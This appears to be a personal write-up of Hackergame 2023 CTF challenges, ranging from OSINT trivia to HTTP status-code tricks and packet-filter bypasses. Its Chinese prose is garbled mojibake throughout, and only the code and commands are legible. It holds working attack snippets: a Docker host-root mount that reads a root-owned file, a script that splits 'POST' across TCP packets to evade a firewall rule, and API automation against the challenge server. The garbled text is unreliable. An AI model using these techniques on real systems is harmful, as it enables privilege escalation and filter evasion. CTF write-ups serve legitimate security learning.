# Hackergame 2023 Writeup

## å‰è¨€

[~~åˆæ˜¯ä¸€å¹´ Hackergameï¼Œé¢˜ç›®ä¾ç„¶é«˜è´¨é‡ï¼Œä¾ç„¶å¯¹èŒæ–°å‹å¥½ï¼Œå„ç§æ¢—ä¹Ÿä¾ç„¶ç©å¾—é£èµ·ã€‚~~](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/official/%E8%B6%85%20OI%20%E7%9A%84%20Writeup%20%E6%A8%A1%E6%8B%9F%E5%99%A8)

ä»Šå¹´é¢˜ç›®è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„æœ‰è¶£ï¼Œè¦æ˜¯æ˜å¹´æœ‰ç©ºçš„è¯è¿˜æ¥å‚åŠ ã€‚

## Hackergame å¯åŠ¨

ç‚¹æäº¤ï¼Œçœ‹åˆ°å¤šäº†ä¸ª similarity çš„ queryï¼Œå¡«å…¥ 100 å›è½¦å³å¯ã€‚

## çŒ«å’ªå°æµ‹

ä»Šå¹´çŒ«å’ªé—®ç­”èƒ½çŸ¥é“å¾—åˆ†ï¼Œå¯ä»¥æ¨å‡ºå“ªé“é¢˜é”™äº†ï¼Œéå¸¸å‹å¥½ã€‚

### æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿï¼ˆ30 åˆ†ï¼‰

[å›¾ä¹¦é¦†ç³»ç»Ÿ](http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=576a723457436a3951576c3236595839686c564673673d3d&list=1) é‡Œèƒ½æœåˆ°è¿™æœ¬ä¹¦ï¼Œå¯æ˜¯æ²¡çœ‹åˆ°å“ªé‡Œå†™å‡ æ¥¼å•Šï¼Ÿ
æ¥¼å±‚ä¸ä¼šå¤ªé«˜ï¼Œå¯ä»¥æ‰‹åŠ¨çŒœã€‚

å†™ wp æ—¶æ‰å‘ç°é¼ æ ‡æ‚¬æµ®åœ¨é¦†è—åœ°ä¸Šä¼šæ˜¾ç¤ºã€‚
~~è¿™äº¤äº’è®¾è®¡è¡Œä¸è¡Œå•Šï¼Œæ˜æ˜ä¸Šé¢çš„â€œé«˜æ–°å›­åŒºç»¼åˆä¹¦åº“â€æ˜¯ç›´æ¥æ ‡å‡ºæ¥¼å±‚çš„ã€‚~~

### ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·

ç”¨å…³é”®è¯ density of chicken in universe èƒ½æœåˆ°[è®ºæ–‡](https://arxiv.org/abs/2303.17626)ã€‚

### ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿ

æœ â€œlinux kernel bbr configâ€ã€‚

### ğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ MyPY mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿ

æœ â€œmypy type annotation infinite loopâ€ æ‰¾åˆ°[è®ºæ–‡](https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf)ã€‚ä»å³ä¸‹è§’ LOGO çŒœæµ‹æ˜¯ ECOOPã€‚

~~å—è¿™ä¸€å±Š GeekGame å½±å“ï¼ŒæŠŠå¹´ä»½å†™ä¸Šå»æäº¤äº†å‘ç°ç­”æ¡ˆé”™è¯¯ã€‚~~


## æ›´æ·±æ›´æš—

å¾€ä¸‹æ‹–å‘ç°æ‹–ä¸åˆ°åº•ï¼Œç›´æ¥ F12 æœç´¢ flagã€‚

~~ä¹ æƒ¯æ€§å…¨é€‰æäº¤ä¸Šå»æ”¶è·äº†ä¸€ä¸ªç­”æ¡ˆé”™è¯¯ï¼Œé‡æäº¤å‘ç°ä¸€è¡€æ²¡äº†å‘œå‘œå‘œã€‚~~

## æ—…è¡Œç…§ç‰‡ 3.0

~~åˆåˆ°äº†è‹¦æ‰‹çš„ç¤¾å·¥é¢˜ï¼Œå»å¹´çŒœèˆªç­çš„é˜´å½±è¿˜æœªæ•£å»ï¼Œä¸è¿‡è‡³å°‘æœ‰æ­¥éª¤åˆ†äº†ã€‚~~

### 1ã€ä½ è¿˜è®°å¾—ä¸å­¦é•¿è§é¢è¿™å¤©æ˜¯å“ªä¸€å¤©å—ï¼Ÿï¼ˆæ ¼å¼ï¼šyyyy-mm-ddï¼‰

å­¦é•¿æˆ´ç€ stat physics 28 çš„èƒ¸ç‰Œï¼Œå¯ä»¥æœåˆ°è¿™ä¸ªä¼šè®®æœŸé—´æ˜¯ 8/7 åˆ° 8/11ï¼Œæ‰‹åŠ¨çŒœä¸€çŒœå¯ä»¥çŸ¥é“ç­”æ¡ˆæ˜¯ 8/10 å·ã€‚

### 2ã€åœ¨å­¦æ ¡è¯¥å±•å…å±•ç¤ºçš„æ‰€æœ‰åŒç§é‡‘è‰²å¥–ç‰Œçš„å¾—ä¸»ä¸­ï¼Œå‡ºç”Ÿæœ€æ™šè€…è·å¥–æ—¶æ‰€åœ¨çš„ç ”ç©¶æ‰€ç¼©å†™æ˜¯ä»€ä¹ˆï¼Ÿ

æœå¥–ç‰Œä¸Šçš„äººå m. koshiba èƒ½çœ‹åˆ°ä¸€ç¯‡è¯ºè´å°”å¥–çš„[æ–°é—»](https://www.icepp.s.u-tokyo.ac.jp/news/Nobel_prize_en.html)ï¼Œæ–°é—»ä¹Ÿå†™å‡ºäº†å®éªŒå®¤å ICRRã€‚

### 3ã€å¸ç¯·ä¸­æ´»åŠ¨æ‹›å‹Ÿå¿—æ„¿è€…æ—¶ç”¨äºæ”¶é›†æŠ¥åä¿¡æ¯çš„åœ¨çº¿é—®å·çš„ç¼–å·ï¼ˆä»¥å­—æ¯ S å¼€å¤´åæ¥æ•°å­—ï¼‰æ˜¯å¤šå°‘ï¼Ÿ

Google lens è¯†å›¾æœåˆ°æ˜¯ä¸Šé‡å…¬å›­ï¼Œé‚£ä¹ˆçœ‹ä¸€çœ‹è¿‡å»çš„[æ´»åŠ¨](https://www.uenopark.info/ad2023/)å§ã€‚
ç¬¦åˆæ—¶é—´çš„åªæœ‰æ¢…é…’æ´»åŠ¨ï¼Œå®˜ç½‘çš„å¿—æ„¿è€…æ‹›å‹Ÿ[é¡µé¢](https://umeshu-matsuri.jp/tokyo_staff/)ä¸Šå°±æœ‰é—®å·åœ°å€ã€‚

### 4ã€å­¦é•¿è´­ä¹°è‡ªå·±çš„åšç‰©é¦†é—¨ç¥¨æ—¶ï¼ŒèŠ±è´¹äº†å¤šå°‘æ—¥å…ƒï¼Ÿ

è¿™ä¸€é—®åšå¾—æˆ‘å¿ƒæ€æœ‰ç‚¹å´©ã€‚æ‰¾äº†ä¸ªåœ°å›¾æŠŠé™„è¿‘æ‰€æœ‰åšç‰©é¦†çš„æˆäººç¥¨ã€å­¦ç”Ÿç¥¨ã€ç‰¹æ®Šå±•ç¥¨ã€é€šå¸¸å±•ç¥¨ç­‰ç­‰å…¨è¯•äº†ä¸€ééƒ½ä¸å¯¹ã€‚
åˆæ— å¥ˆåœ°ä»¥ 10 æ—¥å…ƒä¸ºæ­¥è¿›ä» 500 æ‰‹åŠ¨çˆ†ç ´åˆ°äº† 5000ï¼Œè¿˜æ˜¯éƒ½ä¸å¯¹ã€‚
éšæ‰‹è¯•äº†ä¸ª 0ï¼Œæˆ‘è‰æ€ä¹ˆå¯¹äº†ï¼Ÿç„¶åæ‰å‘ç°åšç‰©é¦†å®˜ç½‘æœ‰è¯´åˆä½œå¤§å­¦å…ç¥¨ã€‚

### 5ã€å­¦é•¿å½“å¤©æ™šä¸Šéœ€è¦åœ¨å“ªæ ‹æ ‡å¿—æ€§å»ºç­‘ç‰©çš„é™„è¿‘é›†åˆå‘¢ï¼Ÿ

é¢˜ç›®è¯´äº†ä¹˜èˆ¹ï¼Œé‚£å½“ç„¶æ˜¯çœ‹çœ‹æœ‰ä»€ä¹ˆè½®æ¸¡èƒ½â€œæ¬£èµä¸œäº¬çš„è¿·äººå¤œæ™¯å’Œé—ªè€€çš„å½©è™¹å¤§æ¡¥â€ã€‚è°ƒç ”äº†åŠå¤©å“ªäº›é‚®è½®èƒ½çœ‹åˆ°è¿™äº›å¤œæ™¯ï¼Œæ‰¾äº†æ‰¾å¯¹åº”çš„å‡ºå‘ç‚¹ï¼ŒæŠŠä¸‹ä¸€é—®åšå®Œæäº¤ç­”æ¡ˆæ—¶å€™å‘ç°ä¸å¯¹ã€‚å› ä¸ºæˆ‘ç¬¬ 6 é—®ç­”æ¡ˆæ¯”è¾ƒç¡®å®šï¼Œä¼°è®¡æ˜¯è¿™é¢˜æœ‰é—®é¢˜ï¼Œäºæ˜¯åˆè¯»äº†éé¢˜ç›®å‘ç°è¯´äº†æ˜¯å­¦æœ¯ä¹‹æ—…ã€‚~~å”‰ï¼Œè¿™ä¹ˆå¤šé‚®è½®æ”»ç•¥ç™½åšäº†ï¼Œå°±å½“äº‘æ—…æ¸¸äº†å§ã€‚~~

åˆå›å»æ‰¾ä¼šè®®çš„[å®‰æ’](https://statphys28.org/images/timetable_230708.jpg)ï¼Œèƒ½çœ‹åˆ° 8/10 æ™šä¸Šæ­£å¥½æœ‰ä¸ªæ™šä¼šï¼Œæœ[æ™šä¼šä¿¡æ¯](https://statphys28.org/banquet.html)å°±çŸ¥é“åœ¨ Yasuda Auditorium (å®‰ç”°è®²å ‚)ã€‚

~~è¿™ç§ä¼šè®®éƒ½è¿™ä¹ˆå¼€å¿ƒçš„å˜›ï¼Œæ˜¯æˆ‘æ²¡è§è¿‡ä¸–é¢äº†ã€‚~~

### 6ã€è¿›ç«™æ—¶ï¼Œä½ åœ¨ JR ä¸Šé‡ç«™ä¸­å¤®æ£€ç¥¨å£å¤–çœ‹åˆ°ã€Œãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ã€æ´»åŠ¨æ­£åœ¨é”€å”®åŠ¨ç‰©å‘¨è¾¹å•†å“ï¼Œè¯¥æ´»åŠ¨å¼ è´´çš„ç²‰è‰²èƒŒæ™¯æµ·æŠ¥ä¸Šæ˜¯ä»€ä¹ˆåŠ¨ç‰©ï¼ˆè®°ä½œ Aï¼Œä¸¤ä¸ªæ±‰å­—ï¼‰ï¼Ÿ åœ¨å‡ºç«™å¤„é™„è¿‘å»ºç­‘çš„å±‹é¡¶å¹¿å‘Šç‰Œä¸Šï¼Œæ¯å°æ—¶éƒ½ä¼šé¡½çš®å‡ºç°çš„é‚£åª 3D åŠ¨ç‰©æ˜¯ä»€ä¹ˆå“ç§ï¼Ÿ

æµ·æŠ¥æ¯”è¾ƒå®¹æ˜“æ‰¾åˆ°ï¼Œæœ ä¸Šé‡ ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ jr å°±èƒ½[çœ‹åˆ°](https://plaza.rakuten.co.jp/ayumilife/diary/202308110000/)ã€‚

å±‹é¡¶å¹¿å‘Šç‰Œå¡äº†æˆ‘å¥½ä¹…ã€‚æ²¡ä»”ç»†å®¡é¢˜ï¼Œæ‰¾äº†åŠå¤©ä¸Šé‡ç«™é™„è¿‘çš„å¹¿å‘Šç‰Œï¼Œå®Œå…¨æ²¡æœåˆ°ã€‚å†æ¬¡è¯»é¢˜çœ‹åˆ°è¯´äº†æ˜¯å‡ºç«™å£ï¼ŒåŸæ¥ä¸æ˜¯ä¸Šé‡ç«™å•Šã€‚ã€‚ã€‚
ä»é©¬é‡Œå¥¥å›¾èƒ½çŒœåˆ°æ˜¯æ¶©è°·ç«™é™„è¿‘çš„ Nintendo TOKYOã€‚ç»§ç»­æœ jræ¶©è°· å¹¿å‘Šç‰Œ 2023 08 ç»ˆäºçœ‹åˆ°äº†ä¼ è¯´ä¸­çš„ 3d å¹¿å‘Šç‰Œã€‚

## èµ›åšäº•å­—æ£‹

å†æ¬¡å— GeekGame å½±å“å…ˆå»çœ‹ cookieï¼Œcookie ä¸€çœ¼ jwt ä½†è§£å¼€æ¥çœ‹ä¸æ‡‚ï¼Œå¼€å§‹çœ‹è¯·æ±‚ã€‚
å¯ä»¥æŒ‡å®š x y åæ ‡ï¼Œé‚£å°±ä¸‹åœ¨å¯¹æ–¹å·²ç»ä¸‹äº†çš„ä½ç½®å¼ºåˆ¶è·èƒœã€‚

## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

æ²¡çœ‹é¢˜é¢ç›´æ¥ä¸‹è½½äº†é™„ä»¶è¿›è¡Œä¸€ä¸ª pngcheckï¼Œå—¯ IEND åé¢æœ‰ IDAT chunkï¼Ÿç ”ç©¶äº†ä¼šå„¿æ€ä¹ˆæ‹¼å›å»ï¼Œå‘ç°è¿‡çš„äººè¶Šæ¥è¶Šå¤šäº†ã€‚
è¿™ä¹ˆå¤šäººè¿‡ï¼Œåº”è¯¥æ²¡é‚£ä¹ˆå¤æ‚å§ï¼Ÿæ€€ç–‘æ¼ä¿¡æ¯äº†ï¼Œçœ‹äº†ä¸‹å‘ç°è¯´äº†æ˜¯ç³»ç»Ÿæ²¡å‡çº§çš„è°·æ­Œäº²å„¿å­ï¼Œåˆç»™äº†æˆªå›¾ï¼Œä¸éš¾æƒ³åˆ°æ˜¯å‰æ®µæ—¶é—´çš„ aCropalypse bug ï¼Œç”šè‡³æœ‰ä¸ª[ç½‘ç«™](https://acropalypse.app/)èƒ½æ¢å¤ã€‚

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

è¿™é¢˜æ¢—ç©å¾—é£èµ·ï¼Œé¡µé¢ä¹Ÿååˆ†ç²¾ç¾ï¼Œä»¥è‡³äºæ²¡çœ‹è¯·æ±‚æ—¶æˆ‘è¿˜ä»¥ä¸ºæ˜¯ç±»ä¼¼ websocket æ–¹å¼æ‹¿äº†å®æ—¶ç”Ÿæˆçš„æ•°æ®ï¼ŒF12 å‘ç°å¹¶ä¸æ˜¯è¿™æ ·ï¼Œåªæ˜¯å‰ç«¯å»¶è¿Ÿæ˜¾ç¤ºï¼Œé‚£ä¹ˆå†™ä¸ªè„šæœ¬åšä¸€ä¸‹è‡ªåŠ¨æ’¤å›ã€‚

```python
from datetime import datetime
import time
import requests


COOKIE = {
    "session": ""
}


def get_messages():
    r = requests.post("http://202.38.93.111:10021/api/getMessages", cookies=COOKIE)
    r.raise_for_status()
    return r.json()["messages"]


def revoke(msg_ig):
    r = requests.post(
        "http://202.38.93.111:10021/api/deleteMessage",
        cookies=COOKIE,
        json={"id": msg_ig},
    )
    r.raise_for_status()
    print(r.json())
    assert r.json()["success"]


def get_flag():
    r = requests.post("http://202.38.93.111:10021/api/getflag", cookies=COOKIE)
    r.raise_for_status()
    print(r.json())


msg = get_messages()
start = datetime.now()
for i, m in enumerate(msg):
    if "hack[" in m["text"]:
        while 1:
            now = datetime.now()
            if (now - start).seconds > m["delay"]:
                break
            time.sleep(0.5)
        revoke(i)


get_flag()
```

## è™«

é¢˜ç›®è¯´äº†æ˜¯é€šè¿‡æ— çº¿ä¿¡é“ä¼ è¾“å›¾ç‰‡çš„æ–¹å¼ï¼Œæœåˆ°æ˜¯ä¸šä½™æ— çº¿ç”µçš„ä¸œè¥¿ï¼Œç»§ç»­ä¸€é¡¿æœç´¢æœåˆ°äº† GNU Radio è¿™ä¸ªè½¯ä»¶ï¼Œè£…äº†åŠå¤©ç¯å¢ƒè¿˜ä¸ä¼šç”¨ã€‚
åˆçœ‹åˆ°é€šè¿‡äººæ•°åˆ·åˆ·åœ°æ¶¨ï¼Œæ€€ç–‘æ–¹å‘é”™äº†ï¼Œç»§ç»­æœç´¢çŸ¥é“äº†æ˜¯ SSTVï¼Œæ‰¾ä¸€ä¸ªå¼€æºå·¥å…·æˆåŠŸæå–ã€‚

`sstv -d insect.wav -o insect.png`

## JSON âŠ‚ YAML?

### JSON âŠ„ YAML 1.1

~~è¿™ä¸€é—®é [æœç´¢](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)æ¡äº†ä¸ªä¸€è¡€~~

`{"a": "\uD834\uDD1E"}`

### JSON âŠ„ YAML 1.2

YAML 1.2 [è§„èŒƒ](http://yaml.org/spec/1.2-old/spec.html#id2759572) æåˆ°äº†ä¸èƒ½æœ‰é‡å¤ keyã€‚
`{"a":"a", "a":"a"}`

## Git? Git!

çœ‹æ ‡é¢˜å°±çŸ¥é“è¦é—®æ•°æ®æ¢å¤ã€‚ç”¨ git reflog å‘½ä»¤å°±å¯ä»¥çœ‹åˆ°å„åˆ†æ”¯ HEAD çš„å˜æ›´å†å²ã€‚checkout åˆ°ä¹‹å‰çš„ commit æ‰¾ flag å³å¯ã€‚
é¡ºå¸¦ä¸€æï¼ŒGitHub [æ–‡æ¡£](https://docs.github.com/en/enterprise-cloud@latest/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository) è®°è½½äº†æ€ä¹ˆå½»åº•åˆ é™¤è¯¯æäº¤çš„æ–‡ä»¶ã€‚

## HTTP é›†é‚®å†Œ

MDN é˜…è¯»é¢˜ã€‚

### 100 Continue
```
GET / HTTP/1.1\r\n
Expect: 100-continue \r\n
Host: example.com\r\n\r\n
```

### 200 OK
```
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

### 206 Partial Content
```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1-2\r\n\r\n
```

### 304 Not Modified
```
GET / HTTP/1.1\r\n
If-None-Match: "64dbafc8-267"\r\n
Host: example.com\r\n\r\n
```

### 400 Bad Request
```
123\r\n\r\n
```

### 404 Not Found
```
GET /1 HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

### 405 Method Not Allowed
```
OPTIONS / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

### 412 Precondition Failed
```
GET / HTTP/1.1\r\n
If-Match: "xxx"\r\n
Host: example.com\r\n\r\n
```

### 413 Payload Too Large
```
POST / HTTP/1.1\r\n
Content-Length: 30000000\r\n
Host: example.com\r\n\r\n
```

### 414 URI Too Long
```
GET /aaaaï¼ˆæ­¤å¤„çœç•¥...ï¼‰ HTTP/1.1\r\n
Host: www.example.com\r\n
Accept-Language: a\r\n\r\n
```

### 416 Range Not Satisfiable
```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=-10000000-2 \r\n\r\n
```

### 505 HTTP Version Not Supported
```
GET / HTTP/233\r\n
Host: example.com\r\n\r\n
```

### æ— çŠ¶æ€ç 

è¿™ä¸€é—®æˆ‘æ˜¯æ‰‹æ”¹è¯·æ±‚æ—¶å¤šåˆ äº†ä¸€ä¸ªç©ºæ ¼æ— æ„é—´è§¦å‘çš„ã€‚

```
GET /HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

## Docker for Everyone

å…‰çœ‹é¢˜é¢ä»¥ä¸ºæ˜¯æš´éœ²äº† docker socket çš„é€ƒé€¸é¢˜ï¼Œè¿›äº†é¢˜ç›®å‘ç°ç›´æ¥æœ‰ host çš„ shellã€‚
~~ä¸è¿‡ä¹Ÿæ˜¯æ§åˆ¶ docker socketï¼Œæ²¡å·®å¤šå°‘~~

docker daemon æ˜¯ root èµ·çš„ï¼Œæ¯”æˆ‘ä»¬æƒé™é«˜ï¼Œé‚£æ€»å½’æœ‰åŠæ³•é€šè¿‡ docker è¯»ã€‚

è¯•äº†ä¸€ä¸‹ docker cp æ²¡æƒé™ï¼Œä½†æ˜¯èƒ½é€šè¿‡æŒ‚è½½æ–¹å¼åœ¨å®¹å™¨é‡Œè®¿é—®ã€‚

```bash
docker run -it --rm -v /:/tmp/ alpine
cat /tmp/dev/shm/flag
```

## æƒœå­—å¦‚é‡‘ 2.0

è¿™ä¸ª 2.0 æ¯” 1.0 ç®€å•ï¼Œ~~æ˜¯å›é€€ bug.~~

è¯»æºç èƒ½å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªå•è¡¨æ›¿æ¢åŠ å¯†ï¼Œå¯†ç è¡¨åŸæœ¬æ¯ä¸€è¡Œæœ‰ 24 ä¸ªå­—ç¬¦ï¼Œæƒœå­—å¦‚é‡‘åæ¯è¡Œå„ç¼ºäº†ä¸€ä¸ªå­—ç¬¦ã€‚

å…ˆåœ¨å„è¡Œæœ«å°¾è¡¥ä¸€ä¸ª 1ï¼Œçœ‹çœ‹æ›¿æ¢å®Œæ€ä¹ˆæ ·ã€‚

`5laulyoufeepr3cvees3df7weparsn3sfr1gwn!}`

å¼€å¤´çš„ `flag{` å˜æˆäº† `5laul`ï¼Œ3 ä¸ªå­—ç¬¦éœ€è¦æ¢å¤ï¼Œå…ˆä»è¿™é‡Œå…¥æ‰‹å§ã€‚
ä»¥æ¢å¤é¦–å­—æ¯çš„ f ä¸¾ä¾‹ï¼Œå¯†æ–‡æ˜¯ 53ï¼Œ ä»£è¡¨ç è¡¨é‡Œç¬¬ 54 ä¸ªå­—ç¬¦åº”è¯¥æ˜¯ fã€‚
ä»ç¬¬ 53 ä¸ªå­—ç¬¦ä¹Ÿæ˜¯ f å°±å¯æ¨å‡ºè¿™é‡Œè¿ç”¨äº†åˆ é™¤é‡å¤è¾…éŸ³çš„è§„åˆ™ï¼Œè¡¥ä¸Š f å¹¶å»é™¤æœ«å°¾çš„ 1 è¿™ä¸€è¡Œå°±æ¢å¤äº†ã€‚
æ¢å¤å®Œè¿™ 3 ä¸ªå­—ç¬¦æ‰“å°çš„ `flag{you-ve-r3cover3d-7he-an5w3r-r1ght?}` çœ‹ç€æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œæäº¤å‘ç°å¯¹äº†ã€‚

## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

`asciinema cat asciinema_restore.rec > output.txt` ç„¶åæŠŠä¸­é—´çš„æ§åˆ¶å­—ç¬¦åˆ æ‰å°±å¯ä»¥äº†ã€‚

## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ

ç¬¬ä¸€é—®ç©ä¸€ç©å°±å‡ºæ¥äº†ï¼Œç¬¬äºŒé—®æ²¡æƒ³æ³•å°±ç›´æ¥çˆ†ç ´äº†ï¼Œå¾—åˆ°ä¸€å †å¾ˆç¥å¥‡çš„ç­”æ¡ˆï¼Œæ¯”å¦‚ `0e` å’Œ `.5` å°±èƒ½æ‹¿åˆ° flag1ï¼Œ`d}` å’Œ `j}` èƒ½æ‹¿åˆ° flag2.

~~åé¢ä¸¤é—®æ‹·æ‰“äº†åŠå¤© GPTï¼Œå¾—åˆ°äº† transformer æ¨¡å‹å¯èƒ½å¯é€†çš„å›å¤å’Œç›¸å…³çš„ä»£ç ï¼Œè¯•äº†å¥½å¤šæ²¡ä¸€ä¸ªèƒ½ç”¨çš„ã€‚~~

## ğŸª æµå¼æ˜Ÿçƒ

å…ˆæŒ‰å¤§å°è¿è’™å¸¦çŒœä¸€å…± 130 å¸§å·¦å³ï¼Œç„¶åçˆ†ç ´ä¸€ä¸‹å¯èƒ½çš„åˆ†è¾¨ç‡ï¼Œé€‰ä¸ªç›¸å¯¹èƒ½çœ‹ç‚¹çš„ 640x480 çš„å°ºå¯¸å¯¼å‡ºæ‰€æœ‰å¸§å‡‘åˆçœ‹ã€‚

~~å—¯ï¼Œæˆ‘çŸ¥é“æŒºæƒ¨ä¸å¿ç¹çš„ï¼Œèƒ½çœ‹æ¸… flag å°±è¡Œã€‚~~

![flagå›¾ç‰‡](assets/restore.webp)

```python
import numpy as np
from PIL import Image

buffer = np.fromfile("video.bin", dtype=np.uint8)

frame_count = 130
frame_height = 200
frame_width = 320

for i in range(frame_height, 1000, 10):
    for j in range(frame_width, 1000, 10):
        if frame_count * i * j * 3 > len(buffer):
            continue
        buffer_new = buffer[: frame_count * i * j * 3].reshape(frame_count, i, j, 3)
        im = Image.fromarray(buffer_new[0])
        im.save(f"{i}x{j}.png")

frame_height = 480
frame_width = 640

buffer_new = buffer[: frame_count * frame_height * frame_width * 3].reshape(
    frame_count, frame_height, frame_width, 3
)

for i in range(frame_count):
    im = Image.fromarray(buffer_new[i])
    im.save(f"{i}.png")
```

## ğŸª ä½å¸¦å®½æ˜Ÿçƒ

æ‹¿ webp å‹ä¸€ä¸‹å°±è¿‡äº†ã€‚

``cwebp image.png -o image.webp -m 6 -lossless``

## Komm, sÃ¼sser Flagge

~~éå¸¸å¥½å¥‡è¿™é¢˜æœåŠ¡å™¨æ”¶äº†å¤šå°‘ä¸ªåŒ…ï¼Œå‘äº†å¤šå°‘ä¸ª RSTï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ç»Ÿè®¡æ•°æ®ã€‚~~

### æˆ‘çš„ POST

è§„åˆ™æ£€æµ‹å•ä¸ª tcp åŒ…é‡Œæ²¡æœ‰ POST çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå¯ä»¥å°† POST æ‹†å¼€æ¥å‘ã€‚

```python
from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET

HOST, PORT = "202.38.93.111", 18080
TOKEN = ""
request = f"ST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Length: 99\r\n\r\n{TOKEN}".encode()
response = ""

with socket(AF_INET, SOCK_STREAM) as sock:
    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    sock.connect((HOST, PORT))
    sock.sendall(b"PO")
    sock.sendall(request)
    while True:
        recv = sock.recv(1024)
        if recv == b"":
            break
        response += recv.decode()
    print(response)
```

### æˆ‘çš„ P

è§„åˆ™çœ‹ç€å¾ˆè¿·æƒ‘ï¼Œä¼¼ä¹åœ¨æ£€æŸ¥ä»€ä¹ˆä¸œè¥¿æ˜¯ä¸æ˜¯ P (ascii 0x50)ï¼Œç”¨çš„è¿˜æ˜¯ u32 æ–¹å¼ï¼ŒçŒœæµ‹åŒ…é‡Œåªæœ‰ 2 ä¸ªå­—èŠ‚å°±ä¸å·¥ä½œäº†ï¼ŒæŠŠç¬¬ä¸€é—®çš„è„šæœ¬æ”¹äº†ä¸ªç«¯å£å·è¯•äº†ä¸€ä¸‹å°±è¿‡äº†ã€‚

### æˆ‘çš„ GET

è§„åˆ™è¦æ±‚æ¯ä¸ªåŒ…å‰ 50 ä¸ªå­—ç¬¦å¿…é¡»æœ‰ `GET / HTTP`ï¼Œå› ä¸º SYN ä¸å¸¦ GETï¼Œæ‰€ä»¥æ— æ³•æ­£å¸¸æ¡æ‰‹ï¼Œé€ æˆ Connection Refused çš„ç°è±¡ã€‚

çœ‹äº†ä¸€ä¸‹ TCP åŒ…å¤´é‡Œæœ‰ä¸ª data offsetï¼Œäºæ˜¯æ‰“ç®—æš´åŠ›å‡ºå¥‡è¿¹ï¼Œç”¨ `libnetfilter_queue` æ‹¦æˆªä¸‹å¤–å‘çš„åŒ…ï¼Œåœ¨æ•°æ®å¼€å¤´æ·»åŠ  `GET / HTTP`ï¼Œä¿®æ”¹ data offsetï¼Œä¿®æ­£å®Œ IP å’Œ TCP å¤´é‡Œçš„ checksum å†å‘å‡ºå»ã€‚è¿™æ ·çš„æ•ˆæœæ˜¯ï¼Œ`GET / HTTP` ä¼šè¢«å½“ä½œ tcp option çš„ä¸€éƒ¨åˆ†ã€‚ä¸æ–™æœåŠ¡å™¨ä¼¼ä¹æ²¡è§è¿‡è¿™ç§æ“ä½œï¼Œä¸€ä¸ªåŠ² RSTã€‚

å®åœ¨æ²¡ä»€ä¹ˆåŠæ³• debugï¼Œäºæ˜¯æˆ‘è¿›è¡Œä¸€ä¸ªæ§åˆ¶å˜é‡æ³•ï¼Œè¿˜æ˜¯æ¯ä¸ªåŒ…å¤´å¸¦ `GET / HTTP`ï¼Œä½†æ˜¯è¿™æ¬¡ä»å¤´æ‰‹æ“ TCP æ¡æ‰‹äº†ï¼Œå†è¯•è¯•ã€‚
